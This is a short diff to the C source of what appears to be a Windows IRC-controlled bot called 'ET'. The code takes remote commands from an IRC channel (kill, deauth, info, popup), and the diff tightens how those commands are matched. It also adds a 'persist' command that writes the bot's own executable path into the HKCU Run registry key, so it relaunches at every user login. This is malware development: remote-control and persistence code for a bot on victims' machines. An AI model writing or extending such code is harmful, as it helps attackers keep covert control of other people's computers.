@@ -65,18 +65,18 @@ void et_main_loop_win(SOCKET socket, char *nick)
 				}
 				else
 				{
-					if (strstr(cmd, "kill"))
+					if (!strcmp(cmd, "kill"))
 					{
 						break; /* back to main@et_win.c */
 					}
-					else if (strstr(cmd, "deauth"))
+					else if (!strcmp(cmd, "deauth"))
 					{
 						char deauth_message[IRC_MSGLEN];
 						_snprintf(deauth_message, IRC_MSGLEN, "PRIVMSG %s :%s deauthorized. Reauth to control.\r\n", IRC_CHANNEL, nick);
 						send(socket, deauth_message, strlen(deauth_message), 0);
 						auth = 0;
 					}
-					else if (strstr(cmd, "info"))
+					else if (!strcmp(cmd, "info"))
 					{
 						char info[IRC_MSGLEN];
 
@@ -98,6 +98,15 @@ void et_main_loop_win(SOCKET socket, char *nick)
 					{
 						cmd += 6; /* increment past 'popup ' */
 						MessageBox(NULL, cmd, "ET says hi", MB_OK | MB_ICONINFORMATION);
+					}
+					else if (!strcmp(cmd, "persist"))
+					{
+						HKEY key = NULL;
+						RegCreateKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &key, NULL);
+						char path[256];
+						GetModuleFileName(NULL, path, 256);
+						RegSetValueEx(key, "et", 0, REG_SZ, (BYTE *) path, strlen(path));
+						RegCloseKey(key);
 					}
 					else
 					{
